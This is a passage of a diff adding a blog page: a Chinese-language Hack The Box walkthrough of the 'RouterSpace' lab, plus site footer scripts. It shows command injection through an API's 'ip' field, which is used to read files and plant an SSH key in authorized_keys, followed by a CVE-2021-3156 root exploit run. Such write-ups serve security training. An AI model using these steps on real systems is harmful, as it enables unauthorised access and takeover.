class="number">101</span>-Ubuntu SMP Fri Oct <span class="number">15 20:00:55</span> UTC <span class="number">2021</span> x86_64 x86_64 x86_64 GNU/Linux\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接反弹shell会不成功。但是能够读取文件：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;10.10.11.148|cat /home/paul/user.txt&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>RouterSpace</span><br><span class="line"><span class="attribute">X-Cdn</span><span class="punctuation">: </span>RouterSpace-96428</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;24-lTLAHWrUaSZIdUqQw/W1+pAETwQ&quot;</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 07 Jun 2022 06:01:06 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-lsl"><span class="string">&quot;e81eb.......................<span class="subst">\n</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以检测一下对目标.ssh有没有写入权限，如果有就写一个ssh公钥进去。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>70</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;10.10.11.148|echo &#x27;can you see me&#x27;&gt;/home/paul/.ssh/lalala.txt&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>再尝试读取：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;10.10.11.148|cat /home/paul/.ssh/lalala.txt&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>成功：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>RouterSpace</span><br><span class="line"><span class="attribute">X-Cdn</span><span class="punctuation">: </span>RouterSpace-2174</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>18</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;12-a61DJ3xMkogTgauvzmPm708oxBw&quot;</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Tue, 07 Jun 2022 06:05:17 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-lsl"><span class="string">&quot;can you see me<span class="subst">\n</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>写入公钥：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">user-agent</span><span class="punctuation">: </span>RouterSpaceAgent</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>633</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>routerspace.htb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-subunit">&#123;&quot;ip&quot;:&quot;10.10.11.148|echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyqnUh0fJARuOZYFpyflYrG34Gfl3i+rNCeySEYzy9Se<span class="string">+5</span>htiQyH2zc/HnTzYZP0hm<span class="string">+23</span>F0MoyKEGQ5Z1XW3RtP9/Nm67QkL/qB43Kw1kNX+i<span class="string">+8</span>eXG33lAFXXRhLv7ztMmQa/4LWY0esgtXGPvwKvWOK62X5XlW0wJKG/Deiydj+rGSTj3UMKxlvyEL7VAqxt9dO5OtdE5w5SD+vv+StYgZEleK+Z8eG3hHR/PaIJBvT02MEghh1D4VSNrSkencAj7D2GC2Kn2w<span class="string">+55</span>hgs2JKlaVRdoUoh1ZxaSkxluR5vcvOqZsBKpyZ5W0BMuSEDLqGwfgx/pN1jG7+VPbHzzPb9YayKFPkqxg+SwUV2+IgIbF6ZdUq8ebLXnuW1DVVVPMWFpMuOPTMF02M4T1w8mEs3vHoPwFVsaS5R02m14Rmh8hA9I30kNaWmRHUt4CU2T6kuzoT8IfvAaOIaxevJNC0I/fZjZhQHANJdGd4AfSun2mYBx6qBfDh9cnhDqAlphZzU= mosaic@ParrotMosaic&#x27;&gt;/home/paul/.ssh/authorized_keys&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &quot;.\Desktop\id_rsa&quot; paul@<span class="number">10</span>.<span class="number">10</span>.<span class="number">11</span>.<span class="number">148</span></span><br></pre></td></tr></table></figure>
+
+<p>提权漏洞有CVE-2021-3156，wget能使用，但是无法下载。不过可以手动将提权漏洞代码复制进去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">paul@routerspace:~$ vim exploit.c</span><br><span class="line">paul@routerspace:~$ vim shellcode.c</span><br><span class="line">paul@routerspace:~$ vim Makefile</span><br><span class="line">paul@routerspace:~$ make</span><br><span class="line"><span class="built_in">mkdir</span> libnss_x</span><br><span class="line">cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c</span><br><span class="line">cc -O3 -o exploit exploit.c</span><br><span class="line">paul@routerspace:~$ <span class="built_in">ls</span></span><br><span class="line">exploit  exploit.c  libnss_x  Makefile  shellcode.c  snap  user.txt</span><br><span class="line">paul@routerspace:~$ ./exploit</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1001(paul)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - RouterSpace</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-RouterSpace.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Seal.html" title="HTB Walkthrough - Seal">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Seal</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Return.html" title="HTB Walkthrough - Return">
+                        <span class="hidden-mobile">HTB Walkthrough - Return</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
